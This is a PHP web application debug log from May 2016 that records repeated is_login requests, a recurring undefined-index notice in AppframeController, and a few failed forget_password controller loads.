NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:05:02+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:07:13+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:14:54+08:00 ] 116.4.68.111 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001954s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:20:32+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:20:37+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:20:40+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:20:41+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000976s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001953s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:20:45+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000977s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002930s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T16:20:47+08:00 ] 116.4.38.55 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000977s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000976s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002929s ]
NOTIC: [8] Undefined index: url D:\test\moqie\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:18:39+08:00 ] 192.168.1.51 /user/forget_password
ERR: 无法加载控制器:Forget_password

[ 2016-05-12T17:18:44+08:00 ] 192.168.1.51 /user/user/forget_password
ERR: 无法加载控制器:User

[ 2016-05-12T17:19:28+08:00 ] 192.168.1.51 /user/user/forget_password
ERR: 无法加载控制器:User

[ 2016-05-12T17:19:47+08:00 ] 192.168.1.51 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:38:14+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:38:19+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:39:03+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:46:30+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:46:38+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002500s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002500s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:46:43+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:51:47+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T17:55:00+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T20:03:10+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T20:03:19+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

[ 2016-05-12T20:07:09+08:00 ] 192.168.1.231 /index.php?g=user&m=index&a=is_login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: url E:\web\WWW\application\Common\Controller\AppframeController.class.php 第 24 行.

